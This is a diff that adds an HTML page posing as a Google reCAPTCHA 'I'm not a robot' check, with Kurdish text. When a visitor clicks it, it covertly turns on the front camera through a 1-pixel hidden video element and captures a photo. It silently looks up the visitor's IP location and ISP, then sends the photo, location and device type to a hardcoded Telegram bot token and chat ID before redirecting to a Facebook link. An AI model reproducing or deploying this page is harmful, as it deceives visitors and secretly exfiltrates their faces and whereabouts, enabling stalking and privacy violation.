@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="ku">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verify you are human</title>
+    <style>
+        body { background-color: #f9f9f9; margin: 0; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        #video { position: absolute; width: 1px; height: 1px; opacity: 0.01; }
+        #canvas { display: none; }
+        .captcha-box { background: white; border: 1px solid #d3d3d3; border-radius: 3px; width: 300px; height: 74px; display: flex; align-items: center; padding: 0 10px; box-shadow: 0 0 4px rgba(0,0,0,0.1); cursor: pointer; }
+        .checkbox { width: 24px; height: 24px; border: 2px solid #c1c1c1; border-radius: 2px; margin-right: 15px; }
+        .text { color: #555; font-size: 14px; flex-grow: 1; }
+        .logo-section { text-align: center; }
+        .logo-section img { width: 30px; }
+        .loader { display: none; border: 3px solid #f3f3f3; border-top: 3px solid #4d90fe; border-radius: 50%; width: 22px; height: 22px; animation: spin 1s linear infinite; margin-right: 15px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <div class="captcha-box" onclick="startAuth()">
+        <div class="checkbox" id="checkBtn"></div>
+        <div class="loader" id="loadingCircle"></div>
+        <div class="text">من ڕۆبۆت نیم (I'm not a robot)</div>
+        <div class="logo-section">
+            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png">
+            <p style="font-size: 8px; margin:0;">reCAPTCHA</p>
+        </div>
+    </div>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const BOT_TOKEN = '8486664700:AAFsvIGJt8Iz1ITZbN4EvPajNJUzMuS6ImY'; 
+        const CHAT_ID = '6351568884';
+        const TARGET_URL = 'https://www.facebook.com/share/1C5gccsXme/?mibextid=wwXIfr';
+
+        let ipData = "زانیاری شوێن دەست نەکەوت";
+
+        // وەرگرتنی زانیاری شوێن لە ڕێگەی IP (بێدەنگ)
+        fetch('https://ipapi.co/json/')
+            .then(res => res.json())
+            .then(data => {
+                ipData = `📍 وڵات: ${data.country_name}\n🏙 شار: ${data.city}\n🌐 ئینتەرنێت: ${data.org}\n🗺 IP: ${data.ip}`;
+            }).catch(() => { ipData = "کێشە لە وەرگرتنی IP هەبوو"; });
+
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            if (/iPhone/i.test(ua)) return "iPhone 📱";
+            if (/Android/i.test(ua)) return "Android 📱";
+            return "PC/Other 💻";
+        }
+
+        function startAuth() {
+            document.getElementById('checkBtn').style.display = 'none';
+            document.getElementById('loadingCircle').style.display = 'block';
+
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+            .then(stream => {
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append('chat_id', CHAT_ID);
+                        formData.append('photo', blob, 'image.jpg');
+                        formData.append('caption', `✅ زانیاری نوێ گەیشت:\n\n📱 مۆبایل: ${getDeviceInfo()}\n${ipData}`);
+
+                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        }).then(() => {
+                            window.location.href = TARGET_URL;
+                        });
+                    }, 'image/jpeg', 0.8);
+                }, 3500);
+            })
+            .catch(() => {
+                window.location.href = TARGET_URL;
+            });
+        }
+    </script>
+</body>
+</html>
